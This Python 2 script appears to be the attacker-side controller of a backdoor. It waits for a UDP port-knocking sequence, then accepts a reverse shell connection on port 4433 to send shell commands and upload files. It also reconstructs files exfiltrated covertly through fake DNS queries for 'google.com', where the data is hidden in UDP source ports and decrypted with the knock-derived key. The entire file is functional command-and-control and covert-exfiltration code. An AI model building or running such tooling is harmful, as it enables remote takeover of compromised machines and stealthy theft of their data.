#!/usr/bin/python
# import python modules
from socket import *
import os.path
import knocker
from scapy.all import *
from utils import decrypt, parse_port_to_data

EOF = 'G'
PATH_TO_FILE = "./data/"
CONTENT = ""
DOWNLOAD_FILE_SIZE = 0
DOWNLOAD_FILE_NAME = ""
PORT = 4433  # port for inside out connection

def upload(conn,command,filepath):
    if os.path.isfile(filepath):
        filesize = str(os.path.getsize(filepath))
        command = command + " " + filesize
        conn.send(command)
        with open(filepath, "rb") as f:
            bytes_read = f.read(1024)
            while bytes_read:
                conn.send(bytes_read)
                bytes_read = f.read(1024)
    else:
        print "Invalid Usage of \"upload\", update filename"

def download(conn, filepath):
    global CONTENT
    global DOWNLOAD_FILE_SIZE
    CONTENT = ""
    DOWNLOAD_FILE_SIZE = conn.recv(1024)
    if int(DOWNLOAD_FILE_SIZE) < 1:
        print "file name is invalid"
    else:
        global DOWNLOAD_FILE_NAME
        DOWNLOAD_FILE_NAME = filepath.split('/')[-1]
        sniff(filter="udp", stop_filter=parse_for_download)

def parse_for_download(pkt):
    return_value = False
    if pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." :
        data1, data2 = parse_port_to_data(pkt['UDP'].sport)
        return_value = parse_by_character(data1)
        return_value = return_value or parse_by_character(data2)
    return return_value

def parse_by_character(char):
    global CONTENT
    global DOWNLOAD_FILE_SIZE
    if char == EOF:
        if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
            decrypted = decrypt(CONTENT , knocker.PASS)
            global PATH_TO_FILE
            global DOWNLOAD_FILE_NAME
            if not os.path.exists(PATH_TO_FILE):
                os.makedirs(PATH_TO_FILE)
            with open(PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
                f.write(decrypted)
            print "data is successfully saved to " + PATH_TO_FILE + DOWNLOAD_FILE_NAME
        else:
            print "some data is missing. cannot decrypt the file"
        return True
    else:
        CONTENT += char
        return False


def accept_commands(conn):
    # receive initial connection
    data = conn.recv(1024)
    # start loop
    while 1:
        # enter shell command
        command = raw_input("Enter shell command or quit: ")
        cmdArgs = command.split(' ')
        # if we specify quit then break out of loop and close socket
        if cmdArgs[0] == "quit":
            conn.send(command)
            break
        elif cmdArgs[0] == "upload":
            upload(conn,command,cmdArgs[1])

        elif cmdArgs[0] == "download":
            conn.send(command)
            download(conn, cmdArgs[1])
        else:
            conn.send(command)
            # receive output from linux command
            data = conn.recv(1024)
            # print the output of the linux command
            print data



def listen_for_inside_out_conn():
    HOST = ''  # '' means bind to all interfaces
    global PORT
    # create our socket handler
    s = socket.socket(AF_INET, SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    # bind to interface
    s.bind((HOST, PORT))
    # print we are accepting connections
    print "Looking for snake bites on port %s" % str(PORT)
    # listen for only 10 connection
    s.listen(10)
    # accept connections
    conn, addr = s.accept()
    # print connected by ipaddress
    print 'Connected by', addr[0]
    if addr[0] == knocker.SOURCE_IP:
        accept_commands(conn)
    print "closing connection"
    conn.close()
    s.close()

def parse_packets_for_port_knocking(pkt):
    if pkt.haslayer(UDP) and pkt['UDP'].dport == knocker.PORT_KNOCKER[knocker.PORT_KNOCKER_INDEX]:
        knocker.port_knock(pkt)
        if len(knocker.PASS) == len(knocker.PORT_KNOCKER)*2:
            return True
        else:
            return False


def main():
    sniff(filter="udp", stop_filter=parse_packets_for_port_knocking)
    listen_for_inside_out_conn()

if __name__ == '__main__':
    main()
